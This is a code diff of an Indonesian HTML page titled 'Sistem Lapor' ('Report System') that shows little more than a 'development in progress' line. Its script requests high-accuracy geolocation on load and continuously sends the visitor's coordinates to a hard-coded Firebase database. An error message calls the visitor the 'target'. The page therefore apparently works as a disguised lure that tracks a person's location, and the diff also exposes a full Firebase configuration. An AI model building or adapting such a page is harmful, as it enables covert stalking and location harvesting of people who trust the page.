@@ -6,9 +6,8 @@
     <title>Sistem Lapor</title>
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
-        import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
+        import { getDatabase, ref, set, remove, onDisconnect } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
 
-        // Konfigurasi Firebase Anda
         const firebaseConfig = {
             apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
             authDomain: "coba-accf3.firebaseapp.com",
@@ -19,44 +18,61 @@
             appId: "1:171764982868:web:19c716f6617667514679c1"
         };
 
-        // Inisialisasi Firebase
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Buat ID perangkat unik
-        const deviceId = "device_" + Math.random().toString(36).substring(2, 15);
-
-        // Simpan lokasi perangkat ke Firebase
-        function saveLocation(lat, lon) {
-            set(ref(database, 'devices/' + deviceId), {
-                latitude: lat,
-                longitude: lon
-            });
-        }
-
-        // Hapus lokasi perangkat saat halaman ditutup
-        function removeLocation() {
-            remove(ref(database, 'devices/' + deviceId));
-        }
-
-        // Dapatkan lokasi perangkat dan simpan ke Firebase
-        window.onload = function() {
+        function getLocation() {
+            console.log("Meminta lokasi...");
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    saveLocation(lat, lon);
+                navigator.geolocation.watchPosition(showPosition, showError, {
+                    enableHighAccuracy: true
                 });
             } else {
-                alert('Geolocation is not supported by this browser.');
+                alert("Geolocation tidak didukung oleh browser ini.");
             }
-        };
+        }
 
-        // Hapus lokasi saat halaman ditutup
-        window.onbeforeunload = removeLocation;
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Mengirim data lokasi ke Firebase berdasarkan session
+            const userId = Date.now(); // ID unik berbasis waktu
+            const locationRef = ref(database, `devices/${userId}`);
+
+            set(locationRef, {
+                latitude: lat,
+                longitude: lon,
+                timestamp: userId
+            });
+
+            // Hapus data dari Firebase saat pengguna keluar
+            onDisconnect(locationRef).remove();
+        }
+
+        function showError(error) {
+            console.log("Error mendapatkan lokasi:", error);
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Target tidak izinkan lokasi.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Informasi lokasi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Permintaan untuk mendapatkan lokasi pengguna telah habis.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Terjadi kesalahan yang tidak diketahui.");
+                    break;
+            }
+        }
+
+        window.onload = getLocation;
     </script>
 </head>
 <body>
     <h1>Sistem Lapor</h1>
+    <p>Proses Development...</p>
 </body>
 </html>
